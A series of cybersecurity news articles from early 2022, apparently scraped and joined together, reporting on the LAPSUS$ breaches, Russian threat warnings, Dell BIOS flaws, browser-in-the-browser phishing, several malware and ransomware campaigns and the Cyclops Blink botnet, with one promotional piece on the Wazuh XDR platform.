target organizations, bribing employees, suppliers, or business partners of companies for access, and intruding in the ongoing crisis-response calls of their targets to initiate extortion demands.\nLAPSUS$ has also been observed deploying the RedLine Stealer that’s available for sale on underground forums to obtain passwords and session tokens, in addition to buying credentials and access tokens from dark web marketplaces as well as searching public code repositories for exposed credentials, to gain an initial foothold.\n\n“The objective of DEV-0537 actors is to gain elevated access through stolen credentials that enable data theft and destructive attacks against a targeted organization, often resulting in extortion,“ the company said. “Tactics and objectives indicate this is a cybercriminal actor motivated by theft and destruction.“\nFollowing initial access, the group is known to exploit unpatched vulnerabilities on internally accessible Confluence, JIRA, and GitLab servers for privilege escalation, before proceeding to exfiltrate relevant information and delete the target’s systems and resources.\nTo mitigate such incidents, Microsoft is recommending organizations to mandate multi-factor authentication (but not SMS-based), make use of modern authentication options such as OAuth or SAML, review individual sign-ins for signs of anomalous activity, and monitor incident response communications for unauthorized attendees.\n“Based on observed activity, this group understands the interconnected nature of identities and trust relationships in modern technology ecosystems and targets telecommunications, technology, IT services and support companies – to leverage their access from one organization to access the partner or supplier organizations,“ Microsoft detailed.\nAmidst the fallout from the leaks, LAPSUS$ appear to be taking a break. “A few of our members has [sic] a vacation until 30/3/2022. We might be quiet for some times [sic],“ the group said on its Telegram channel.\n\n\nFound this article interesting?

'text': 'Microsoft and authentication services provider Okta said they are investigating claims of a potential breach alleged by the LAPSUS$ extortionist gang.\nThe development, which was first reported by Vice and Reuters, comes after the cyber criminal group posted screenshots and source code of what it said were the companies’ internal projects and systems on its Telegram channel.\nThe leaked 37GB archive shows that the group may have accessed the repositories related to Microsoft’s Bing, Bing Maps, and Cortana, with the images highlighting Okta’s Atlassian suite and in-house Slack channels.\n\n“For a service that powers authentication systems to many of the largest corporations (and FEDRAMP approved) I think these security measures are pretty poor,“ the hacking cartel wrote on Telegram.\nOn top of this, the group alleged that it breached LG Electronics (LGE) for the “second time“ in a year.\nBill Demirkapi, an independent security researcher, noted that “LAPSUS$ appears to have gotten access to the Cloudflare tenant with the ability to reset employee passwords,“ adding the company “failed to publicly acknowledge any breach for at least two months.“\n\nLAPSUS$ has since clarified that it did not breach Okta’s databases and that “our focus was ONLY on Okta customers.“ This could pose serious implications for other government agencies and companies that rely on Okta to authenticate user access to internal systems.\n“In late January 2022, Okta detected an attempt to compromise the account of a third-party customer support engineer working for one of our subprocessors. The matter was investigated and contained by the subprocessor,“ Okta CEO Todd McKinnon said in a tweet.\n“We believe the screenshots shared online are connected to this January event. Based on our investigation to date, there is no evidence of ongoing malicious activity beyond the activity detected in January,“ McKinnon added.\nCloudflare, in response, said it’s resetting the Okta credentials of employees who have changed their passwords in the last four months, out of abundance of caution.\n\nUnlike traditional ransomware groups that follow the double extortion playbook of stealing data from a victim and then encrypting that information in return for a payment, the new entrant to the threat landscape focuses more on data theft and using it to blackmail the targets.\nIn the months since it went active in late December 2021, the cybercrime gang has racked up a long list of high-profile victims, including Impresa, NVIDIA, Samsung, Mercado Libre, Vodafone, and most recently Ubisoft.\n“Any successful attack against a service provider or software developer can have further impact beyond the scope of that initial attack,“ Mike DeNapoli, lead security architect of Cymulate, said in a statement. “Users of the services and platforms must be alerted to the fact that there are possible supply-chain attacks that will need to be defended against.“\n\n\nFound this article interesting?

{'title': 'Wazuh Offers XDR Functionality at a Price Enterprises Will Love — Free!',
'text': 'Back in 2018, Palo Alto Networks CTO and co-founder Nir Zuk coined a new term to describe the way that businesses needed to approach cybersecurity in the years to come. That term, of course, was extended detection and response (XDR). It described a unified cybersecurity infrastructure that brought endpoint threat detection, network analysis and visibility (NAV), access management, and more under a single roof to find and neutralize digital threats in real-time.\nAnd Zuk’s vision of XDR proved prophetic. In the years since he coined the phrase, platforms leveraging the XDR model have emerged as the de-facto leaders of the business cybersecurity industry. But their scale and complexity put them in a product class that’s just out of reach for some enterprises.\nFortunately, the open-source community — as it often does — has filled the XDR void with an affordable product — because it’s totally free. It’s called Wazuh, and it provides enterprises the tools they need to build a customized XDR solution that meets their cybersecurity and budgetary needs at the same time. Here’s how.\nThe Key Features of an XDR Platform\nAlthough the varied implementations of XDR solutions come with varying feature sets, most XDR platforms have a few major features in common. They include:\nData Analytics and Detection Functionality\n\nMuch of the threat detection offered by XDR solutions come in the form of data analytics. By analyzing the logs and performance of major systems, it’s often possible to spot abnormal activity or threats. To facilitate this, XDR platforms typically perform analysis of both external and internal traffic, compare performance and log data against known threat profiles, and employ machine learning techniques to detect emerging threat patterns such as those of zero-day attacks.\nThreat Investigation and Active Response\nXDR platforms don’t only provide businesses with a way to spot potential threats. They also provide tools to help IT specialists investigate those threats and deploy various countermeasures to neutralize them using active responses. To make that possible, most XDR platforms provide a centralized alert system that can group related log alerts from multiple systems into a single UI. That UI can also help administrators respond to alerts by orchestrating responses across a variety of endpoints. Using that functionality, admins can update enterprise-wide security policies in response to a detected attack on a single endpoint.\nScalability and Evolutionary Capability\nLast but not least, XDR platforms make it easy for businesses to integrate new systems, technologies, and endpoints to keep them protected. That means they’re built for scalability and interoperability with a wide variety of other vendor-specific technology products. In that way, they’re a relatively future-proof solution that grows with a business over time. But they also include machine learning functionalities that help their defensive capabilities adapt to a given technology environment and improve as they work.\nHow Wazuh Delivers XDR Functionality\nThe brilliance of the Wazuh approach to XDR is that it can readily integrate with a variety of other open-source security tools. That means businesses that use it can adapt the system to serve their specific needs without any complex and expensive licensing agreements getting in the way. For example, PDQ Deploy to install software and patches on workstations, AbuseIPDB to detect malicious IP addresses involved in spamming, hacking attempts and DDoS attacks, and URLhaus to detect malicious URLs used for malware distribution.\nBut the core of the Wazuh XDR approach comes in the form of its multi-platform monitoring agent. It’s compatible with most devices via its high-level OS support. That means businesses can deploy it to begin collecting endpoint data with very little customization needed. Those agents stream system information back to the Wazuh server, where it performs a variety of anomaly and malware detection routines on it. In that way, administrators gain instant visibility into endpoint security through the server’s centralized interface. But that’s not all.\nThrough integrations with tools like Suricata and OwlH, administrators get powerful network intrusion detection and visualization functions. That gives them the same kind of situational awareness that other major XDR platforms offer, but without the associated price tag. And the system can even execute automated threat response routines based on network and endpoint data — taking action to stop attacks in their tracks with little to no manual intervention required.\nAnd because Wazuh is an open-source solution, it offers the ultimate in scalability and evolutionary capabilities. It can already integrate with security-focused machine learning solutions like Amazon’s Macie, giving it stored data surveillance capabilities. But the possibility for additional integrations is endless. That means businesses that opt to use Wazuh as an XDR solution won’t be locked into a particular machine learning system, and they can tailor the system’s evolutionary capability to their own needs.\nThe Critical Takeaways\nThere’s little doubt that today’s major XDR solutions represent the current state-of-the-art in business-grade cybersecurity. And their all-encompassing approach to defending digital business infrastructure likely represents the future of it, too. That’s because they acknowledge the reality that protecting business data and assets means having true transparency into endpoint operations and allowing for infrastructure-wide responses to threats at a moment’s notice.\nAlthough XDR will not penetrate the cybersecurity market for a few years due to scaling issues, the fact that an open source solution like Wazuh exists is no small feat. It holds the power to provide meaningful and effective XDR functionality to organizations of all sizes. And it’s also flexible enough to adapt to changing business needs and new technology integrations. It’s no exaggeration to say it’s a true game-changer in the cybersecurity space as it exists today.\nAnd best of all — it’s free and growing at a rapid pace with the support of the open-source community. All businesses have to do to take advantage of it is to invest in some modest hardware to serve as a control hub, or can simply use Wazuh Cloud. They can use Wazuh to create a bespoke XDR system that’s on par with anything now available on the commercial market.\nAnd even better, they’ll end up with a system that’s endlessly customizable and upgradeable — meaning it’s a system that businesses can invest in without fear that it will someday be outmoded and obsolete.\nThere aren’t many solutions in the world of cybersecurity that can make such a claim — making Wazuh a force to be reckoned with in the XDR market writ large.\n\n\nFound this article interesting?

{'title': 'U.S. Government Warns Companies of Potential Russian Cyber Attacks',
'text': 'The U.S. government on Monday once again cautioned of potential cyber attacks from Russia in retaliation for economic sanctions imposed by the west on the country following its military assault on Ukraine last month.\n“It’s part of Russia’s playbook,“ U.S. President Joe Biden said in a statement, citing “evolving intelligence that the Russian Government is exploring options.“\nThe development comes as the Cybersecurity and Infrastructure Security Agency (CISA) and the Federal Bureau of Investigation (FBI) warned of “possible threats“ to U.S. and international satellite communication (SATCOM) networks in the wake of a cyber attack targeting Viasat KA-SAT network, used extensively by the Ukrainian military, roughly around the time when Russian armed forces invaded Ukraine on February 24.\n“Successful intrusions into SATCOM networks could create risk in SATCOM network providers’ customer environments,“ the agencies said.\n\nTo strengthen cybersecurity defenses against malicious cyber activity, the government is recommending organizations to mandate the use of multi-factor authentication, ensure that systems are up-to-date and patched against all known vulnerabilities, encrypt data at rest, and maintain offline backups.\n“Build security into your products from the ground up — ’bake it in, don’t bolt it on’ — to protect both your intellectual property and your customers’ privacy,“ the U.S. government noted, while also urging companies to scrutinize the provenance of software components, open-source or otherwise, to watch out for supply chain threats.\nCERT-UA Sounds the Alarm\nThe warnings about spillover incidents follow a barrage of cyber attacks that have struck both Ukraine and Russia over the past few weeks (although they have been quite muted compared to the contrary). Russia, for its part, has urged domestic firms to turn off automatic software updates and switch to Russian DNS servers.\nLast week, Ukraine’s Computer Emergency Response Team (CERT-UA) also notified of new spear-phishing campaigns targeting state entities with the goal of deploying a backdoor called LoadEdge. The agency attributed the attacks to InvisiMole, a hacking crew with suspected ties to the Russia-based nation state group Gamaredon.\nSeparately, the CERT-UA alerted that information systems of Ukrainian enterprises are being compromised by C#-based wiper program called DoubleZero that’s engineered to overwrite all non-system files and render the machines inoperable.\nSpam campaigns piggybacking on the war in Ukraine have also materialized in other ways, some of which leverage charity-themed lures in an attempt to steal money and compromise victims’ devices from across the world, once again indicating that cybercrooks are adept at tailoring their schemes for maximum impact.\n“86% of the fraudulent messages were sent from IP addresses in Lithuania, ending up in inboxes in South Korea (40%), Czech Republic (16%), Germany (7%), the US and UK (5% each), India (4%), Romania, and Italy (2% each),“ cybersecurity firm Bitdefender said.\nWhat’s more, the emerging trend of using “protestware“ to poison widely-used open-source libraries as a way of condemning the war has led to fears that it could risk damaging critical systems and undermine confidence in the security of the software supply chain and the open-source ecosystem.\n\nAs a consequence, Russian state-owned bank Sberbank has advised users to temporarily abandon software updates, in addition to calling on “developers to increase control over the use of external source code [and] conduct a manual or automated check, including viewing the text of the source code,“ according to state news service TASS.\nConti Version 3 Leaks\nThat’s not all. The Russian invasion of Ukraine has also manifested in the form of crowdsourced hacktivist efforts to participate in a variety of digital actions against Russia, primarily leaning on DDoS attacks and publishing troves of sensitive corporate information.\nForemost in the list is an anonymous Ukrainian security researcher dubbed @ContiLeaks, who leaked the source code of the Russia-based Conti ransomware, including the more recent “version 3,“ as well as nearly 170,000 internal chat conversations between the gang members earlier this month, after the group sided with Russia. \nIn related news, Moscow’s Tverskoy district court outlawed Meta-owned social media platforms Facebook and Instagram for engaging in “extremist activities,“ banning the company from doing business in the country with immediate effect. The ruling follows a temporary decision on part of Meta allowing users in Eastern Europe to post content calling for violence against Russian soldiers.\n\n\nFound this article interesting?

{'title': 'New Dell BIOS Bugs Affect Millions of Inspiron, Vostro, XPS, Alienware Systems',
'text': 'Five new security weaknesses have been disclosed in Dell BIOS that, if successfully exploited, could lead to code execution on vulnerable systems, joining the likes of firmware vulnerabilities recently uncovered in Insyde Software’s InsydeH2O and HP Unified Extensible Firmware Interface (UEFI).\nTracked as CVE-2022-24415, CVE-2022-24416, CVE-2022-24419, CVE-2022-24420, and CVE-2022-24421, the high-severity vulnerabilities are rated 8.2 out of 10 on the CVSS scoring system.\n“The active exploitation of all the discovered vulnerabilities can’t be detected by firmware integrity monitoring systems due to limitations of the Trusted Platform Module (TPM) measurement,“ firmware security company Binarly, which discovered the latter three flaws, said in a write-up.\n\n“The remote device health attestation solutions will not detect the affected systems due to the design limitations in visibility of the firmware runtime.“\nAll the flaws relate to improper input validation vulnerabilities affecting the System Management Mode (SMM) of the firmware, effectively allowing a local authenticated attacker to leverage the system management interrupt (SMI) to achieve arbitrary code execution.\nSystem Management Mode refers to a special-purpose CPU mode in x86 microcontrollers that’s designed for handling system-wide functions like power management, system hardware control, thermal monitoring, and other proprietary manufacturer-developed code.\nWhenever one of these operations is requested, a non-maskable interrupt (SMI) is invoked at runtime, which executes SMM code installed by the BIOS. Given that SMM code executes at the highest privilege level and is invisible to the underlying operating system, the method makes it ripe for abuse to deploy persistent firmware implants.\n\nA number of Dell products, including Alienware, Inspiron, Vostro line-ups, and Edge Gateway 3000 Series, are impacted, with the Texas-headquartered PC manufacturer recommending customers to upgrade their BIOS at the “earliest opportunity.“\n“The ongoing discovery of these vulnerabilities demonstrate what we describe as ’repeatable failures’ around the lack of input sanitation or, in general, insecure coding practices,“ Binarly researchers said.\n“These failures are a direct consequence of the complexity of the codebase or support for legacy components that get less security attention, but are still widely deployed in the field. In many cases, the same vulnerability can be fixed over multiple iterations, and still, the complexity of the attack surface leaves open gaps for malicious exploitation.“\n\n\nFound this article interesting?

{'title': 'New Browser-in-the Browser (BITB) Attack Makes Phishing Nearly Undetectable',
'text': 'A novel phishing technique called browser-in-the-browser (BitB) attack can be exploited to simulate a browser window within the browser in order to spoof a legitimate domain, thereby making it possible to stage convincing phishing attacks.\nAccording to penetration tester and security researcher, who goes by the handle mrd0x on Twitter, the method takes advantage of third-party single sign-on (SSO) options embedded on websites such as “Sign in with Google“ (or Facebook, Apple, or Microsoft).\n\nWhile the default behavior when a user attempts to sign in via these methods is to be greeted by a pop-up window to complete the authentication process, the BitB attack aims to replicate this entire process using a mix of HTML and CSS code to create an entirely fabricated browser window.\n\n“Combine the window design with an iframe pointing to the malicious server hosting the phishing page, and it’s basically indistinguishable,“ mrd0x said in a technical write-up published last week. “JavaScript can be easily used to make the window appear on a link or button click, on the page loading etc.“\nInterestingly, the technique has been abused in the wild at least once before. In February 2020, Zscaler disclosed details of a campaign that leveraged the BitB trick to siphon credentials for video game digital distribution service Steam by means of fake Counter-Strike: Global Offensive (CS: GO) websites.\n\n“Normally, the measures taken by a user to detect a phishing site include checking to see if the URL is legitimate, whether the website is using HTTPS, and whether there is any kind of homograph in the domain, among others,“ Zscaler researcher Prakhar Shrotriya said at the time.\n“In this case, everything looks fine as the domain is steamcommunity[.]com, which is legitimate and is using HTTPS. But when we try to drag this prompt from the currently used window, it disappears beyond the edge of the window as it is not a legitimate browser pop-up and is created using HTML in the current window.“\nWhile this method significantly makes it easier to mount effective social engineering campaigns, it’s worth noting that potential victims need to be redirected to a phishing domain that can display such a fake authentication window for credential harvesting.\n“But once landed on the attacker-owned website, the user will be at ease as they type their credentials away on what appears to be the legitimate website (because the trustworthy URL says so),“ mrd0x added.\n\n\nFound this article interesting?

{'title': 'New Backdoor Targets French Entities via Open-Source Package Installer',
'text': 'Researchers have exposed a new targeted email campaign aimed at French entities in the construction, real estate, and government sectors that leverages the Chocolatey Windows package manager to deliver a backdoor called Serpent on compromised systems.\nEnterprise security firm Proofpoint attributed the attacks to a likely advanced threat actor based on the tactics and the victimology patterns observed. The ultimate objective of the campaign remains presently unknown.\n“The threat actor attempted to install a backdoor on a potential victim’s device, which could enable remote administration, command and control (C2), data theft, or deliver other additional payloads,“ Proofpoint researchers said in a report shared with The Hacker News.\n\nThe phishing lure that triggers the infection sequence makes use of a resume-themed subject line, with the attached macro-embedded Microsoft Word document masquerading as information related to the European Union’s General Data Protection Regulation (GDPR).\nEnabling the macros results in its execution, which retrieves a seemingly harmless image file hosted on a remote server but actually contains a Base64-encoded PowerShell script that’s obscured using steganography, a little-used method of concealing malicious code within an image or audio in order to circumvent detection.\n\nThe PowerShell script, in turn, is engineered to install the Chocolatey utility on the Windows machine, which is then utilized to install the Python package installer pip, the latter of which acts as conduit to install the PySocks proxy library.\nAlso retrieved by the same PowerShell script is another image file from the same remote server that includes the camouflaged Python backdoor dubbed Serpent, which comes with capabilities to execute commands transmitted from the C2 server.\n\nIn addition to steganography, the use of widely recognized tools such as Chocolatey as an initial payload for follow-on deployment of genuine Python packages is an attempt to stay under the radar and not be flagged as a threat, Proofpoint said.\nThe attacks have not unearthed associations with a previously identified actor or group, but are suspected to be the work of a sophisticated hacking crew.\n“This is a novel application of a variety of technologies that are often legitimately used within organizations,“ Sherrod DeGrippo, vice president of threat research and detection at Proofpoint, said in a statement.\n“It capitalizes on many organizations’, specifically technical groups, desire to allow their users to be ’self-sufficient’ in regards to self-tooling and package managers.

'text': 'Social engineering attacks leveraging a combination of romantic lures and cryptocurrency fraud have been deceiving unsuspecting victims into installing fake apps by taking advantage of legitimate iOS features like TestFlight and Web Clips.\nCybersecurity company Sophos, which has named the organized crime campaign “CryptoRom,“ characterized it as a wide-ranging global scam.\n“This style of cyber-fraud, known as sha zhu pan (杀猪盘) — literally ’pig butchering plate’ — is a well-organized, syndicated scam operation that uses a combination of often romance-centered social engineering and fraudulent financial applications and websites to ensnare victims and steal their savings after gaining their confidence,“ Sophos analyst Jagadeesh Chandraiah said in a report published last week.\n\nThe campaign works by approaching potential targets through dating apps like Bumble, Tinder, Facebook Dating, and Grindr, before moving the conversation to messaging apps such as WhatsApp and urging the victims to install a cryptocurrency trading application that’s designed to mimic popular brands and lock people out of their accounts and freeze their funds.\n\nPrevious variants of the social engineering scam observed in October 2021 were found to leverage lookalike App Store pages to deceive people into installing the rogue iOS apps, not to mention abuse Apple’s Developer Enterprise Program to deploy sketchy mobile provisioning profiles to distribute the malware.\n\nBut the new attack wave observed by Sophos takes advantage of Apple’s TestFlight beta testing framework and a device management feature called Web Clips, which allows URLs to specific web pages to be placed on the home screen of users’ iOS devices just like a traditional application.\n\nOnce installed, the crooks promise the individuals huge financial returns in return for making a monetary investment, while artificially manipulating the numbers on the fake app to “reinforce the con“ and convince the victims into believing that “they are making money“ through the platform.\n“The scam doesn’t end with just fooling victims into investing,“ Chandraiah elaborated. “When victims try to withdraw funds from their big ’profit,’ the crooks use the app to inform them that they need to pay a ’tax’ of 20% of their profits before funds can be withdrawn — and threaten that all their investments will be confiscated by tax authorities if they do not pay.“\n\n\nFound this article interesting?

{'title': 'South Korean DarkHotel Hackers Targeted Luxury Hotels in Macau',
'text': 'Luxury hotels in the Chinese special administrative region of Macau were the target of a malicious spear-phishing campaign from the second half of November 2021 and through mid-January 2022.\nCybersecurity firm Trellix attributed the campaign with moderate confidence to a suspected South Korean advanced persistent threat (APT) tracked as DarkHotel, building on research previously published by Zscaler in December 2021.\nBelieved to be active since 2007, DarkHotel has a history of striking “senior business executives by uploading malicious code to their computers through infiltrated hotel Wi-Fi networks, as well as through spear-phishing and P2P attacks,“ Zscaler researchers Sahil Antil and Sudeep Singh said. Prominent sectors targeted include law enforcement, pharmaceuticals, and automotive manufacturers.\n\nThe attack chains involved distributing email messages directed to individuals in executive roles in the hotel, such as the vice president of human resources, assistant manager, and front office manager, indicating that the intrusions were aimed at staff who were in possession of access to the hotel’s network.\nIn one phishing lure sent to 17 different hotels on December 7, the email purported to be from the Macau Government Tourism Office and urged the victims to open an Excel file named “信息.xls“ (“information.xls“). In another case, the emails were faked to gather details about people staying in the hotels.\n\nThe malware-laced Microsoft Excel file, when opened, tricked the recipients into enabling macros, triggering an exploit chain to gather and exfiltrate sensitive data from the compromised machines back to a remote command-and-control (C2) server (“fsm-gov[.]com“) that impersonated the government website for the Federated States of Micronesia (FSM).\n“This IP was used by the actor to drop new payloads as first stages to set up the victim environment for system information exfiltration and potential next steps,“ Trellix researchers Thibault Seret and John Fokker said in a report published last week. “Those payloads were used to target major hotel chains in Macau, including the Grand Coloane Resort and Wynn Palace.“\n\nAlso noteworthy is the fact that the C2 server IP address has continued to remain active despite prior public disclosure and that it’s being used to serve phishing pages for an unrelated credential harvesting attack directed at MetaMask cryptocurrency wallet users.\nThe campaign is said to have to met its inevitable end on January 18, 2022 coinciding with the rise of COVID-19 cases in Macau, prompting the cancelation or postponement of a number of international trade conferences that were set to take place in the targeted hotels.\n“The group was trying to lay the foundation for a future campaign involving these specific hotels,“ the researchers said. “In this campaign, the COVID-19 restrictions threw a wrench in the threat actor’s engine, but that doesn’t mean they have abandoned this approach.“\n\n\nFound this article interesting?

'text': 'A financially motivated threat actor has been observed deploying a previously unknown rootkit targeting Oracle Solaris systems with the goal of compromising Automatic Teller Machine (ATM) switching networks and carrying out unauthorized cash withdrawals at different banks using fraudulent cards.\nThreat intelligence and incident response firm Mandiant is tracking the cluster under the moniker UNC2891, with some of the group’s tactics, techniques, and procedures sharing overlaps with that of another cluster dubbed UNC1945.\nThe intrusions staged by the actor involve “a high degree of OPSEC and leverage both public and private malware, utilities, and scripts to remove evidence and hinder response efforts,“ Mandiant researchers said in a new report published this week.\n\nEven more concerningly, the attacks spanned several years in some cases, during the entirety of which the actor remained undetected by taking advantage of a rootkit called CAKETAP, whic is designed to conceal network connections, processes, and files.\nMandiant, which was able to recover memory forensic data from one of the victimized ATM switch servers, noted that one variant of the kernel rootkit came with specialized features that enabled it to intercept card and PIN verification messages and use the stolen data to perform fraudulent cash withdrawals from ATM terminals.\n\nAlso put to use are two backdoors known as SLAPSTICK and TINYSHELL, both attributed to UNC1945 and are employed to gain persistent remote access to mission-critical systems as well as shell execution and file transfers via rlogin, telnet, or SSH.\n“In line with the group’s familiarity with Unix and Linux based systems, UNC2891 often named and configured their TINYSHELL backdoors with values that masqueraded as legitimate services that might be overlooked by investigators, such as systemd (SYSTEMD), name service cache daemon (NCSD), and the Linux at daemon (ATD),“ the researchers pointed out.\n\nAdditionally, the attack chains were spotted utilizing a variety of malware and publicly-available utilities, including –\nSTEELHOUND – A variant of the STEELCORGI in-memory dropper that’s used to decrypt an embedded payload and encrypt new binariesWINGHOOK – A keylogger for Linux and Unix based operating systems that captures the data in an encoded formatWINGCRACK – A utility that’s used to parse the encoded content generated by WINGHOOKWIPERIGHT – An ELF utility that erases log entries pertaining to a specific user on Linux and Unix based systemsMIGLOGCLEANER – An ELF utility that wipes logs or remove certain strings from logs on Linux and Unix based systems\n“[UNC2891] uses their skill and experience to take full advantage of the decreased visibility and security measures that are often present in Unix and Linux environments,“ the researchers said. “While some of the overlaps between UNC2891 and UNC1945 are notable, it is not conclusive enough to attribute the intrusions to a single threat group.“\n\n\nFound this article interesting?

{'title': 'Experts Find Some Affiliates of BlackMatter Now Spreading BlackCat Ransomware',
'text': 'An analysis of two ransomware attacks has identified overlaps in the tactics, techniques, and procedures (TTPs) between BlackCat and BlackMatter, indicating a strong connection between the two groups.\nWhile it’s typical of ransomware groups to rebrand their operations in response to increased visibility into their attacks, BlackCat (aka Alphv) marks a new frontier in that the cyber crime cartel is built out of affiliates of other ransomware-as-a-service (RaaS) operations.\nBlackCat first emerged in November 2021 and has since targeted several organizations worldwide over the past few months. It has been called out for being similar to BlackMatter, a short-lived ransomware family that originated from DarkSide, which, in turn, attracted notoriety for its high-profile attack on Colonial Pipeline in May 2021.\n\nIn an interview with Recorded Future’s The Record last month, a BlackCat representative dismissed speculations that it’s a rebranding of BlackMatter, while noting that it’s made up of affiliates associated with other RaaS groups.\n\n“In part, we are all connected to gandrevil [GandCrab / REvil], blackside [BlackMatter / DarkSide], mazegreggor [Maze / Egregor], lockbit, etc., because we are adverts (aka affiliates),“ the unnamed representative was quoted as saying. “We borrowed their advantages and eliminated their disadvantages.“\n\n“BlackCat seems to be a case of vertical business expansion,“ Cisco Talos researchers Tiago Pereira and Caitlin Huey said. “In essence, it’s a way to control the upstream supply chain by making a service that is key to their business (the RaaS operator) better suited for their needs and adding another source of revenue.“\nWhat’s more, the cybersecurity firm said it observed a number of commonalities between a BlackMatter attack in September 2021 and that of a BlackCat attack from December 2021, including the tools and the file names used as well as a domain employed to maintain persistent access to the target network.\nThis overlapping use of the same command-and-control address has raised the possibility that the affiliate that used BlackMatter was likely one of the early adopters of BlackCat, with both the attacks taking more than 15 days to reach the encryption stage.\n\n“As we have seen several times before, RaaS services come and go. Their affiliates, however, are likely to simply move on to a new service. And with them, many of the TTPs are likely to persist,“ the researchers said.\nThe findings come as BlackBerry detailed a new .NET-based ransomware family called LokiLocker that not only encrypts the files but also incorporates an optional wiper functionality that’s designed to erase all non-system files and overwrite the master boot record (MBR) should a victim refuse to pay up within a specified timeframe.\n“LokiLocker works as a limited-access ransomware-as-a-service scheme that appears to be sold to a relatively small number of carefully vetted affiliates behind closed doors,“ the researchers said. Active since at least August 2021, a majority of victims detected so far are concentrated in Eastern Europe and Asia.\n\n\nFound this article interesting?

'text': 'Google’s Threat Analysis Group (TAG) took the wraps off a new initial access broker that it said is closely affiliated to a Russian cyber crime gang notorious for its Conti and Diavol ransomware operations.\nDubbed Exotic Lily, the financially motivated threat actor has been observed exploiting a now-patched critical flaw in the Microsoft Windows MSHTML platform (CVE-2021-40444) as part of widespread phishing campaigns that involved sending no fewer than 5,000 business proposal-themed emails a day to 650 targeted organizations globally.\n“Initial access brokers are the opportunistic locksmiths of the security world, and it’s a full-time job,“ TAG researchers Vlad Stolyarov and Vlad Stolyarov said. “These groups specialize in breaching a target in order to open the doors — or the Windows — to the malicious actor with the highest bid.“\n\nExotic Lily, first spotted in September 2021, is said to have been involved in data exfiltration and deployment of the human-operated Conti and Diavol ransomware strains, both of which share overlaps with Wizard Spider, the Russian cyber criminal syndicate that’s also known for operating TrickBot, BazarBackdoor, and Anchor.\n“Yes, this is a possibility, especially considering this is more sophisticated and targeted than a traditional spam campaign, but we don’t know for sure as of now,“ Google TAG told The Hacker News when asked whether Exotic Lily could be another extension of the Wizard Spider group.\n“In the Conti leaks, Conti members mention ’spammers’ as someone who they work with (e.g., provide custom-built ’crypted’ malware samples, etc.) through outsourcing. However, most of the ’spammers’ don’t seem to be present (or actively communicate) in the chat, hence leading to a conclusion they’re operating as a separate entity.“\n\nThe threat actor’s social engineering lures, sent from spoofed email accounts, have specifically singled out IT, cybersecurity, and healthcare sectors, although post November 2021, the attacks have grown to be more indiscriminate, targeting a wide variety of organizations and industries.\nBesides using fictitious companies and identities as a means to build trust with the targeted entities, Exotic Lily has leveraged legitimate file-sharing services like WeTransfer, TransferNow and OneDrive to deliver BazarBackdoor payloads in a bid to evade detection mechanisms.\n\nThe rogue personas often posed as employees of firms such as Amazon, complete with fraudulent social media profiles on LinkedIn that featured fake AI-generated profile pictures. The group is also said to have impersonated real company employees by lifting their personal data from social media and business databases like RocketReach and CrunchBase.\n\n“At the final stage, the attacker would upload the payload to a public file-sharing service (TransferNow, TransferXL, WeTransfer or OneDrive) and then use a built-in email notification feature to share the file with the target, allowing the final email to originate from the email address of a legitimate file-sharing service and not the attacker’s email, which presents additional detection challenges,“ the researchers said.\nAlso delivered using the MHTML exploit is a custom loader called Bumblebee that’s orchestrated to gather and exfiltrate system information to a remote server, which responds back commands to execute shellcode and run next-stage executables, including Cobalt Strike.\nAn analysis of the Exotic Lily’s communication activity indicates that the threat actors have a “typical 9-to-5 job“ on weekdays and may be possibly working from a Central or an Eastern Europe time zone.\n“Exotic Lily seems to operate as a separate entity, focusing on acquiring initial access through email campaigns, with follow-up activities that include deployment of Conti and Diavol ransomware, which are performed by a different set of actors,“ the researchers concluded.\n\n\nFound this article interesting?

'text': 'ASUS routers have emerged as the target of a nascent botnet called Cyclops Blink, almost a month after it was revealed the malware abused WatchGuard firewall appliances as a stepping stone to gain remote access to breached networks.\nAccording to a new report published by Trend Micro, the botnet’s “main purpose is to build an infrastructure for further attacks on high-value targets,“ given that none of the infected hosts “belong to critical organizations, or those that have an evident value on economic, political, or military espionage.“\nIntelligence agencies from the U.K. and the U.S. have characterized Cyclops Blink as a replacement framework for VPNFilter, another malware that has exploited network devices, primarily small office/home office (SOHO) routers, and network-attached storage (NAS) devices.\n\nBoth VPNFilter and Cyclops Blink have been attributed to a Russian state-sponsored actor tracked as Sandworm (aka Voodoo Bear), which has also been linked to a number of high-profile intrusions, including that of the 2015 and 2016 attacks on the Ukrainian electrical grid, the 2017 NotPetya attack, and the 2018 Olympic Destroyer attack on the Winter Olympic Games.\nWritten in the C language, the advanced modular botnet affects a number of ASUS router models, with the company acknowledging that it’s working on an update to address any potential exploitation –\nGT-AC5300 firmware under 3.0.0.4.386.xxxxGT-AC2900 firmware under 3.0.0.4.386.xxxxRT-AC5300 firmware under 3.0.0.4.386.xxxxRT-AC88U firmware under 3.0.0.4.386.xxxxRT-AC3100 firmware under 3.0.0.4.386.xxxxRT-AC86U firmware under 3.0.0.4.386.xxxxRT-AC68U, AC68R, AC68W, AC68P firmware under 3.0.0.4.386.xxxxRT-AC66U_B1 firmware under 3.0.0.4.386.xxxxRT-AC3200 firmware under 3.0.0.4.386.xxxxRT-AC2900 firmware under 3.0.0.4.386.xxxxRT-AC1900P, RT-AC1900P firmware under 3.0.0.4.386.xxxxRT-AC87U (end-of-life)RT-AC66U (end-of-life), andRT-AC56U (end-of-life)\nCyclops Blink, besides using OpenSSL to encrypt communications with its command-and-control (C2) servers, also incorporates specialized modules that can read and write from the devices’ flash memory, granting it the ability to achieve persistence and survive factory resets.\nA second reconnaissance module serves as a channel for exfiltrating information from the hacked device back to the C2 server, while a file download component takes charge of retrieving arbitrary payloads optionally via HTTPS.\n\nThe exact mode of initial access is currently not known, but Cyclops Blink is said to have impacted WatchGuard devices and Asus routers located in the U.S., India, Italy, Canada, and Russia since June 2019. Some of the affected hosts belong to a law firm in Europe, a medium-sized entity producing medical equipment for dentists in Southern Europe, and a plumbing company in the U.S.\nWith IoT devices and routers becoming a lucrative attack surface due to the infrequency of patching and the absence of security software, Trend Micro warned that this could lead to the formation of “eternal botnets.“\n“Once an IoT device is infected with malware, an attacker can have unrestricted internet access for downloading and deploying more stages of malware for reconnaissance, espionage, proxying, or anything else that the attacker wants to do,“ the researchers said.\n“In the case of Cyclops Blink, we have seen devices that were compromised for over 30 months (about two and a half years) in a row and were being set up as stable command-and-control servers for other bots.“\n\n\nFound this article interesting?

